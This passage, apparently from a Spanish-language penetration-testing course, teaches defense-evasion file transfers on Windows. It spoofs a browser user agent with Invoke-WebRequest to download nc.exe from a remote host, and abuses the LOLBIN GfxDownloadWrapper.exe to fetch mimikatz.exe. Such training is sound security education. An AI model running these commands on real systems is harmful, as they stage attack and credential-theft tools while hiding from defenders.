Si administradores o defensores diligentes han incluido en la lista negra a cualquiera de estos agentes de usuario, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contiene un parámetro UserAgent, que permite cambiar el agente de usuario predeterminado a uno que emule Internet Explorer, Firefox, Chrome, Opera o Safari. Por ejemplo, si Chrome se usa internamente, configurar este agente de usuario puede hacer que la solicitud parezca legítima.

#### Listado de agentes de usuario
```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

#### Solicitar con el agente de usuario de Chrome
```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

## LOLBAS / GTFOBins
La inclusión de aplicaciones en la lista blanca puede impedirle utilizar PowerShell o Netcat, y el registro de la línea de comandos puede alertar a los defensores sobre su presencia. En este caso, una opción puede ser utilizar un "LOLBIN" (binario que vive de la tierra), también conocido como "binarios de confianza fuera de lugar". Un ejemplo de LOLBIN es el controlador de gráficos Intel para Windows 10 (GfxDownloadWrapper.exe), instalado en algunos sistemas y que contiene funcionalidad para descargar archivos de configuración periódicamente. Esta funcionalidad de descarga se puede invocar de la siguiente manera:
#### Transferencia de archivos con GfxDownloadWrapper.exe
```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

